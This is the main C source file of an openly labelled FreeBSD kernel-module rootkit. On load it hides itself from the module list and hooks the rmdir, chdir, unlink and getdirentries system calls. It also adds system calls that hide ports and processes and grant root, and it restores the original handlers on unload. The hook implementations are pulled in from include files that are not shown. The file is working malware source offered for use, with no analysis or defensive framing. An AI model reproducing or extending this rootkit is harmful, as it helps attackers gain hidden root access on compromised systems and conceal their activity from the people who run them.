/*
Freebsd KLD Rootkit
Freebsd Kernel Module Rootkit for FreeBSD 13
developed by : Antonius
website : https://www.bluedragonsec.com
github :  https://github.com/bluedragonsecurity
twitter : https://twitter.com/bluedragonsec
*/
#include "includes/bds_header.h"
#include "includes/bds_declaration.h"
#include "includes/bds_vars.h"
#include "includes/bds_rmdir.c"
#include "includes/bds_chdir.c"
#include "includes/bds_unlink.c"
#include "includes/bds_hide_module.c"
#include "includes/bds_port_hiding.c"
#include "includes/bds_process_hiding.c"
#include "includes/bds_getdirentries.c"
#include "includes/bds_root.c"

static int load(struct module *module, int cmd, void *args) {
	int error = 0;

	switch(cmd) {
	case MOD_LOAD:
		bds_hide_module();
		sysent[SYS_rmdir].sy_call = (sy_call_t *) bds_rmdir;
		sysent[SYS_chdir].sy_call = (sy_call_t *) bds_chdir;
		sysent[SYS_unlink].sy_call = (sy_call_t *) bds_unlink;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)bds_getdirentries;
		SYSCALL_MODULE(bds_port_hiding, &syscall_port_hiding_no, &syscall_bds_port_hiding_sysent, load, NULL);
		SYSCALL_MODULE(bds_process_hiding, &syscall_proc_hiding_no, &syscall_bds_process_hiding_sysent, load, NULL);
		SYSCALL_MODULE(bds_root, &syscall_bds_root_no, &bds_root_sysent, load, NULL);
		break;
	case MOD_UNLOAD:
		sysent[SYS_rmdir].sy_call = (sy_call_t *) sys_rmdir;
		sysent[SYS_chdir].sy_call = (sy_call_t *) sys_chdir;
		sysent[SYS_unlink].sy_call = (sy_call_t *) sys_unlink;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}

	return error;
}

static moduledata_t bds_kld_mod = {
	"bds_kld",
	load,
	NULL
};

DECLARE_MODULE(bds_kld, bds_kld_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

